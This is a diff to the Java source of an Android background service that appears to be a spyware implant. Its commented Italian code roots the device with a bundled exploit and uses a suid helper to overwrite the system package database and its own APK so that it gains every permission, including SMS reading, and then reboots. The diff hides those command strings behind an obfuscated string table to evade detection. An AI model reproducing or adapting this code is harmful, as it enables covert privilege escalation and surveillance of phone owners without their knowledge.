@@ -13,7 +13,6 @@ import java.io.OutputStreamWriter;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
-import java.util.ArrayList;
 import java.util.Arrays;
 
 import javax.crypto.Cipher;
@@ -39,8 +38,6 @@ import android.widget.Toast;
 
 import com.android.service.auto.Cfg;
 import com.android.service.capabilities.PackageInfo;
-import com.android.service.conf.Configuration;
-import com.android.service.file.AutoFile;
 import com.android.service.util.Check;
 import com.android.service.util.Utils;
 
@@ -124,12 +121,14 @@ public class ServiceCore extends Service {
 	public void onStart(Intent intent, int startId) {
 		super.onStart(intent, startId);
 
-		if (Cfg.EXP) {
-			if (PackageInfo.checkRoot() == true) {
-				Status.self().setRoot(true);
-			} else {
-				Status.self().setRoot(false);
+		if (PackageInfo.checkRoot() == true) {
+			Status.self().setRoot(true);
+		} else {
+			Status.self().setRoot(false);
+		}
 
+		if (Cfg.EXP) {
+			if (PackageInfo.checkRoot() == false) {
 				// Don't exploit if we have no SD card mounted
 				if (android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED)) {
 					Status.self().setRoot(root());
@@ -178,7 +177,8 @@ public class ServiceCore extends Service {
 		PackageManager pkg = Status.getAppContext().getPackageManager();
 
 		if (pkg != null) {
-			int perm = pkg.checkPermission("android.permission.READ_SMS", "com.android.service");
+			// android.permission.READ_SMS, com.android.service
+			int perm = pkg.checkPermission(Messages.getString("32.16"), Messages.getString("32.17"));
 
 			if (perm == PackageManager.PERMISSION_GRANTED) {
 				return 2;
@@ -191,21 +191,27 @@ public class ServiceCore extends Service {
 			openFileOutput("test", Context.MODE_WORLD_READABLE);
 
 			// Copiamo packages.xml nel nostro path e rendiamolo scrivibile
-			invokeRun("/system/bin/ntpsvd fhc /data/system/packages.xml /data/data/com.android.service/files/packages.xml");
+			// /system/bin/ntpsvd fhc /data/system/packages.xml
+			// /data/data/com.android.service/files/packages.xml
+			invokeRun(Messages.getString("32.18"));
 			Utils.sleep(600);
-			invokeRun("/system/bin/ntpsvd pzm 666 /data/data/com.android.service/files/packages.xml");
+			// /system/bin/ntpsvd pzm 666
+			// /data/data/com.android.service/files/packages.xml
+			invokeRun(Messages.getString("32.19"));
 
 			// Rimuoviamo il file temporaneo
-			File tmp = new File("/data/data/com.android.service/files/test");
+			// /data/data/com.android.service/files/test
+			File tmp = new File(Messages.getString("32.20"));
 
 			if (tmp.exists() == true) {
 				tmp.delete();
 			}
 
 			// Aggiorniamo il file
-			FileInputStream fin = openFileInput("packages.xml");
-
-			PackageInfo pi = new PackageInfo(fin, "com.android.service");
+			// packages.xml
+			FileInputStream fin = openFileInput(Messages.getString("32.21"));
+			// com.android.service
+			PackageInfo pi = new PackageInfo(fin, Messages.getString("2.17"));
 
 			String path = pi.getPackagePath();
 
@@ -220,7 +226,8 @@ public class ServiceCore extends Service {
 				}
 
 				// Rimuoviamo la nostra copia
-				File f = new File("/data/data/com.android.service/files/packages.xml");
+				// /data/data/com.android.service/files/packages.xml
+				File f = new File(Messages.getString("32.22"));
 
 				if (f.exists() == true) {
 					f.delete();
@@ -229,41 +236,50 @@ public class ServiceCore extends Service {
 				return 2;
 			}
 
-			pi.addRequiredPermissions("perm.xml");
+			// perm.xml
+			pi.addRequiredPermissions(Messages.getString("32.23"));
 
 			// .apk con tutti i permessi nel manifest
 			InputStream manifestApkStream = getResources().openRawResource(R.raw.layout);
-			fileWrite(manifest, manifestApkStream, "0xA83E0F44BD7A4D20");
+			fileWrite(manifest, manifestApkStream, Messages.getString("36.0"));
 
 			// Copiamolo in /data/app/*.apk
-			invokeRun("/system/bin/ntpsvd qzx \"cat /data/data/com.android.service/files/layout > " + path + "\"");
+			// /system/bin/ntpsvd qzx \"cat
+			// /data/data/com.android.service/files/layout >
+			invokeRun(Messages.getString("32.24") + path + "\"");
 
 			// Copiamolo in /data/system/packages.xml
-			invokeRun("/system/bin/ntpsvd qzx \"cat /data/data/com.android.service/files/perm.xml > /data/system/packages.xml\"");
+			// /system/bin/ntpsvd qzx
+			// \"cat /data/data/com.android.service/files/perm.xml > /data/system/packages.xml\""
+			invokeRun(Messages.getString("32.25"));
 
 			// Rimuoviamo la nostra copia
-			File f = new File("/data/data/com.android.service/files/packages.xml");
+			// /data/data/com.android.service/files/packages.xml
+			File f = new File(Messages.getString("32.22"));
 
 			if (f.exists() == true) {
 				f.delete();
 			}
 
 			// Rimuoviamo il file temporaneo
-			f = new File("/data/data/com.android.service/files/perm.xml");
+			// /data/data/com.android.service/files/perm.xml
+			f = new File(Messages.getString("32.26"));
 
 			if (f.exists() == true) {
 				f.delete();
 			}
 
 			// Rimuoviamo l'apk con tutti i permessi
-			f = new File("/data/data/com.android.service/files/layout");
+			// /data/data/com.android.service/files/layout
+			f = new File(Messages.getString("32.27"));
 
 			if (f.exists() == true) {
 				f.delete();
 			}
 
 			// Riavviamo il telefono
-			invokeRun("/system/bin/ntpsvd reb");
+			// /system/bin/ntpsvd reb
+			invokeRun(Messages.getString("32.28"));
 		} catch (Exception e1) {
 			if (Cfg.DEBUG) {
 				Check.log(e1);//$NON-NLS-1$
@@ -297,10 +313,12 @@ public class ServiceCore extends Service {
 
 			Resources resources = getResources();
 			InputStream stream = resources.openRawResource(R.raw.statuslog);
-			fileWrite(exploit, stream, "0x5A3D10448D7A912B");
+			//"0x5A3D10448D7A912B"
+			fileWrite(exploit, stream, Messages.getString("36.1"));
 
 			stream = resources.openRawResource(R.raw.statusdb);
-			fileWrite(suidext, stream, "0x5A3D10448D7A912A");
+			//0x5A3D10448D7A912A
+			fileWrite(suidext, stream, Messages.getString("36.2"));
 
 			// Eseguiamo l'exploit
 			final File filesPath = getApplicationContext().getFilesDir();
@@ -442,7 +460,6 @@ public class ServiceCore extends Service {
 				final BufferedWriter stdin = new BufferedWriter(new OutputStreamWriter(localProcess.getOutputStream()));
 				final BufferedReader stdout = new BufferedReader(new InputStreamReader(localProcess.getInputStream()));
 				final BufferedReader stderr = new BufferedReader(new InputStreamReader(localProcess.getErrorStream()));
-				final String full = null;
 				String line = null;
 
 				while ((line = stdout.readLine()) != null) {
